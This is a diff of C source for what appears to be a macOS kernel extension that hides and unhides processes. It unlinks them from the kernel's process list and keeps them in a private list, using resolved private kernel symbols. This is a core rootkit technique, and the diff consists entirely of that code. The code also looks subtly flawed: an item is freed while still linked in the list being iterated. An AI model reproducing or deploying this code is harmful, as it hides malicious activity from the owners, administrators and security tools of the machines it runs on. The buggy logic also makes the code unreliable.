@@ -7,6 +7,7 @@
 //
 
 #include <mach/mach_types.h>
+#include <libkern/OSMalloc.h>
 #include <mach-o/loader.h>
 #include <mach-o/nlist.h>
 #include <mach/mach_types.h>
@@ -15,9 +16,16 @@
 #include "proc_internal.h"
 #include "symbol.h"
 
-#define MAX_HIDDEN_PROCS 100
-struct proc *hiddenProcs[MAX_HIDDEN_PROCS];
-unsigned int hiddenCount = 0;
+struct hiddenProc {
+    
+    struct proc *process;
+    OSMallocTag tag;
+    
+    LIST_ENTRY(hiddenProc) processes;
+    
+};
+
+LIST_HEAD(hiddenProcsHead, hiddenProc) hidden_procs_head;
 
 kern_return_t
 hideProcess(pid_t pid) {
@@ -46,10 +54,16 @@ hideProcess(pid_t pid) {
             /* Actually hdie the process. */
             LIST_REMOVE(process, p_list);
             
-            if(hiddenCount <= MAX_HIDDEN_PROCS) {
-                hiddenProcs[hiddenCount] = process;
-                hiddenCount++;
-            }
+            /* Add it to our list */
+            char tagStr[101];
+            snprintf(tagStr, 100, "hiddenProc-%i", process->p_pid);
+            OSMallocTag tag = OSMalloc_Tagalloc(tagStr, OSMT_DEFAULT);
+            struct hiddenProc *item = OSMalloc(sizeof(struct hiddenProc), tag);
+            item->process = process;
+            item->tag = tag;
+            
+            
+            LIST_INSERT_HEAD(&hidden_procs_head, item, processes);
             
             /* Unlock the list */
             proc_list_unlock();
@@ -59,12 +73,30 @@ hideProcess(pid_t pid) {
         
     }
     
-    return KERN_SUCCESS;
+    return KERN_FAILURE;
     
 }
 
 kern_return_t
-showProcess(pid_t process) {
+showProcess(pid_t pid) {
+    
+    struct hiddenProc *item;
+    
+    /* Find the required symbols */
+    struct proclist *allproc = find_symbol("_allproc");
+    void (*proc_list_lock)(void) = find_symbol("_proc_list_lock");
+    void (*proc_list_unlock)(void) = find_symbol("_proc_list_unlock");
+    
+    LIST_FOREACH(item, &hidden_procs_head, processes) {
+        
+        if(item->process->p_pid == pid) {
+            proc_list_lock();
+            LIST_INSERT_HEAD(allproc, item->process, p_list);
+            proc_list_unlock();
+            OSFree(item, sizeof(struct hiddenProc), item->tag);
+            return KERN_SUCCESS;
+        }
+    }
     
     return KERN_FAILURE;
 }
